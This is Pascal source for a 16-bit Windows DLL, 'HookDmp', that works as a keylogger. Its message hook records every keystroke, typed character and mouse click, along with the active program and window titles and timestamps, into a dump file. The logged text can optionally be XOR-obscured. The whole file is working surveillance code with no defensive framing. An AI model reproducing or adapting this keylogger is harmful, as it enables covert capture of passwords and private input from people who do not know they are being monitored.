library HookDmp;


uses WinTypes, WinProcs,
     {$ifdef VER80}
        Messages,
     {$endif}
     Strings, WinDos, ioString;

{$I types}

const Window: HWnd = 0;
      {Flag:Boolean = False;}

const  Prog: PChar = '             by iLya      ';

Function VerProc:Word; export;
  Begin
    VerProc:=Version;
  End;

Function IntToStr(I:Integer):String;
var S:String;
begin
  str(i,S);
  if Length(S)=1 Then S:='0'+S;
  IntToStr:=S;
end;
const dow: array [0..7] of string[3] =
      ('Sun','Mon','Tue','Wed','Thu','Fri','Sat','Sun');
Function Date:String;
var dY,dM,dD,dDW,dH,dMM,dS,dS100:Word;
begin
  GetDate(dY,dM,dD,dDW);
  Date:=inttostr(dY)+'-'+inttostr(dM)+'-'+inttostr(dD)+'\'+dow[dDW];
end;
Function Time:String;
var dY,dM,dD,dDW,dH,dMM,dS,dS100:Word;
begin
  GetTime(dH,dMM,dS,dS100);
  Time:=inttostr(dH)+':'+inttostr(dMM);
end;
function XorString(const N:String;XorBase:byte):String;
var i:byte;
    R:String;
begin
  R:=N;
  for i:=1 to Length(N) do
    byte(R[i]):=byte(N[i]) xor XorBase;
  XorString:=R;
end;


Function  OpenDump(N,Z:String):Boolean;  export;  Begin  End;
Function  CloseDump(Z:String):Boolean;  export;  Begin  End;
Procedure RegisterRusInd(Wnd:HWnd);    export;  Begin  End;

{==============================================================}

const Inited:boolean=false;
Var
  F:Text;
  SBuf,CurProg:string;
  lpfnNextHook:TFarProc;
  FileName:String;
  CurCodePage,X:Word;


Function WriteOld(N:String):Boolean;
begin
  if st.AnsiToOem Then Begin
    N:=Rus_Windows2Dos(N);
  end;
  Append(F);
  System.Write(F,N);
  Close(F);
end;

const BUF:PChar = nil;
{Type pRec = ^TRec;
     TRec = Record
       SumSize:LongInt;
       Str:String;
       Next:pRec;
     end;
Const FirstRec:pRec = nil;

Procedure FlashRec(var i:pRec);
begin
  if i=nil then exit;
  if i^.next<>nil then begin FlashRec(i^.next); i^.next:=nil; end;
  Append(F);
  System.Write(F,i^.str);
  Close(F);
  Dispose(i);
  I:=nil;
end;

Function RecSumSize:LongInt;
begin
  if FirstRec=nil then RecSumSize:=0
  else RecSumSize:=FirstRec^.SumSize;
end;

Procedure NewRec(N:String);
var t:pRec;
begin
  New(t);
  t^.Str:=N;
  t^.SumSize:=RecSumSize+Length(N);
  t^.next:=FirstRec;
  FirstRec:=t;

  if RecSumSize>st.BufSize then FlashRec(FirstRec);
end;}

Procedure FlashStr;
begin
  Append(F);
  System.Write(F,BUF);
  Close(F);
  BUF[0]:=#0;
end;

Procedure AddStr(N:String);
var p:pChar;
begin
  if BUF=nil Then Exit;
  if StrLen(BUF)+Length(N)>=st.BufSize Then FlashStr;
  N:=N+#0;
  P:=StrEnd(BUF);
  StrCopy(P,@N[1]);
end;

Function WriteStr(N:String):Boolean;
begin
  if st.AnsiToOem Then Begin
    N:=Rus_Windows2Dos(N);
  end;
  if st.XorOutput Then Begin
    N:=XorString(N,st.XorBase);
  end;
  if st.UseBuffer then {NewRec(N)}AddStr(N)
  else begin
    {FlashRec(FirstRec);}
    FlashStr;
    Append(F);
    System.Write(F,N);
    Close(F);
  end;
end;

Procedure Open;
begin
  Assign(F,FileName);
  Reset(F);
  if ioResult<>0
  Then ReWrite(F)
  Else Append(F);

  Close(F);
  WriteStr(#13#10'[It''s a Hook Dump file '+Date+' '+Time+']');
end;

Procedure InitWindow(Wnd:HWnd; var _FileN:String; var First:boolean); export;
begin
  Window:=Wnd;
  First:=Inited;
  if not Inited Then begin
    FileName:=_FileN;
    Inited:=True;
    Open;
  end
  else begin
    _FileN:=FileName;
  end;
end;

Procedure DoneWindow(Wnd:HWnd); export;
begin
  Window:=0;
end;


Procedure SetStatus(S:TSt); export;
begin
  St:=S;
  if BUF=nil Then begin
    if st.BufSize<255 Then st.BufSize:=255;
    GetMem(BUF,st.BufSize);
    Buf[0]:=#0;
  end;
end;


const KeyState:Word=0;
      k_Menu=1;
      k_Shift=2;
      k_Control=4;
      k_WinL=8;
      k_WinR=16;
      vk_WinL=$5B;
      vk_WinR=$5C;

Function GetLongKeyName(M:TMsg):string;
var S:string;
begin
  GetKeyNameText(M.LParam,@SBuf[1],sizeof(SBuf));
  S:=strpas(@SBuf[1]);
  {if GetKeyState(vk_Menu)<>0 Then S:='Alt+'+S;
  if GetKeyState(vk_Shift)<>0 Then S:='Shift+'+S;
  if GetKeyState(vk_Control)<>0 Then S:='Ctrl+'+S;}
  if (KeyState and k_Menu)<>0 Then S:='Alt+'+S;
  if (KeyState and k_Shift)<>0 Then S:='Shift+'+S;
  if (KeyState and k_Control)<>0 Then S:='Ctrl+'+S;
 { if (KeyState and k_WinL)<>0 Then S:='Win+'+S; }
  GetLongKeyName:=S;
end;

Function GetLongMouseKeyName(M:TMsg):string;
var S:string;
begin
  S:='';
  if (M.Message = WM_LBUTTONUP) or
     (M.Message = WM_LBUTTONDown) Then S:='LMouse';
  if (M.Message = WM_MBUTTONUP) or
     (M.Message = WM_MBUTTONDown) Then S:='MMouse';
  if (M.Message = WM_RBUTTONUP) or
     (M.Message = WM_RBUTTONDown) Then S:='RMouse';
  if S<>'' Then begin
    if (KeyState and k_Menu)<>0 Then S:='Alt+'+S;
    if (KeyState and k_Shift)<>0 Then S:='Shift+'+S;
    if (KeyState and k_Control)<>0 Then S:='Ctrl+'+S;
  end;
  GetLongMouseKeyName:=S;
end;


const LastKey:Word = 0;
      LastWM:Word = 0;
      LastTask:Word = 0;
      LastWnd:Word = 0;

function Accept(Key,WM:Word):Boolean;
begin
  if (LastKey<>Key) or (LastWM<>WM) Then begin
    LastKey:=Key;
    LastWM:=WM;
    Accept:=True;
  end
  else Accept:=False;
end;

Procedure WriteModule;
Var W,Wnd,ActW:HWnd;
    Task:THandle;
begin
  if (st.ExeName=false) and (st.WndName=false) Then exit;
  Task:=GetCurrentTask;
  Wnd:=GetFocus;
  if (LastTask<>Task) or (LastWnd<>Wnd) Then begin
     LastTask:=Task;
     LastWnd:=Wnd;
     WriteStr(#13#10'[');
     if (st.ExeName) Then begin
       byte(SBuf[0]):=GetModuleFileName(Task,@SBuf[1],sizeof(SBuf));
       CurProg:=SBuf;
       FileSplit(@CurProg[1],@SBuf,Prog,@SBuf);
       WriteStr(strpas(Prog));
     end;
     if (st.ExeName) and (st.WndName) Then WriteStr('|');
     if (st.WndName) Then begin
       ActW:=GetActiveWindow;
       if ActW<>Wnd Then begin
         GetWindowText(ActW,@SBuf[1],sizeof(SBuf));
         WriteStr(strpas(@SBuf[1])+' - ');
       end;
       GetWindowText(Wnd,@SBuf[1],sizeof(SBuf));
       WriteStr(strpas(@SBuf[1]));
     end;
     if (st.WndExeTime) Then begin      {время}
       SBuf:=' |'+Time+#0;
       WriteStr(strpas(@SBuf[1]));
     end;
     WriteStr(']'#13#10);
  end;
end;

function MsgHookProc(code:Integer; WParamq: Word;
  LParamq: Longint): Longint; export;
  var P : PMsg absolute LParamq;
  Begin

    Case P^.Message of

      WM_KEYDOWN,WM_SysKEYDOWN:
      if Accept(p^.WParam,WM_KEYDOWN) Then
      Begin
        WriteModule;
        case p^.WParam of
          vk_Menu: KeyState:=KeyState or k_Menu;
          vk_Shift: KeyState:=KeyState or k_Shift;
          vk_Control: KeyState:=KeyState or k_Control;
          {vk_WinL: KeyState:=KeyState or k_WinL;
          vk_WinR: KeyState:=KeyState or k_WinR;}
          else if st.WritePush Then begin
            WriteStr('{'#$19+GetLongKeyName(P^)+'}');
            {+inttostr(P^.WParam)}
          end;
        end;
      end;

      WM_KEYUp,WM_SysKEYUp:
      if Accept(p^.WParam,WM_KEYUp) Then
      Begin
        WriteModule;
        case p^.WParam of
          vk_Menu: KeyState:=KeyState and not k_Menu;
          vk_Shift: KeyState:=KeyState and not k_Shift;
          vk_Control: KeyState:=KeyState and not k_Control;
          {vk_WinL: KeyState:=KeyState and not k_WinL;
          vk_WinR: KeyState:=KeyState and not k_WinR;}
          else if st.WritePop Then begin
            WriteStr('{'#$18+GetLongKeyName(P^)+'}');
            {+inttostr(P^.WParam)}
          end;
        end;
      end;

      wm_Char,wm_SysChar:
      if Accept(p^.WParam,WM_Char) Then
      Begin
         WriteModule;
         {x:=GetKBCodePage;}
         if st.WriteBasic Then WriteStr(char(P^.WParam));
      end;

      WM_MBUTTONUP,WM_LBUTTONUP,WM_RBUTTONUP:
      if st.UseMouse Then
      begin
        WriteModule;
        if st.WritePop Then
          WriteStr('{'#$18+GetLongMouseKeyName(P^)+'}');
      end;
      WM_MBUTTONDown,WM_LBUTTONDown,WM_RBUTTONDown:
      if st.UseMouse Then
      begin
        WriteModule;
        if st.WritePush Then
          WriteStr('{'#$19+GetLongMouseKeyName(P^)+'}');
      end;

    End{case};
    DefHookProc(Code,wParamq,lParamq,lpfnNextHook);
  End;


  Procedure SETlpfnNextHook(P:TFarProc);  export;
  Begin
    lpfnNextHook:=P;
  End;

  var oldExitProc:Pointer;
  Procedure dllExitProc;
  begin
    ExitProc:=oldExitProc;
    if inited Then begin
      WriteStr(#13#10'[End of file. '+Time+']'#13#10)
    end;
    FlashStr;
    {FlashRec(FirstRec);}
  end;


Exports
  MsgHookProc index 1 resident,
  SETlpfnNextHook index 2,

  OpenDump index 3,
  CloseDump index 4,
  RegisterRusInd index 5,

  VerProc,
  InitWindow index 7,
  DoneWindow index 8,
  SetStatus  index 9;

Begin
  oldExitProc:=ExitProc;
  ExitProc:=@dllExitProc;
End.;

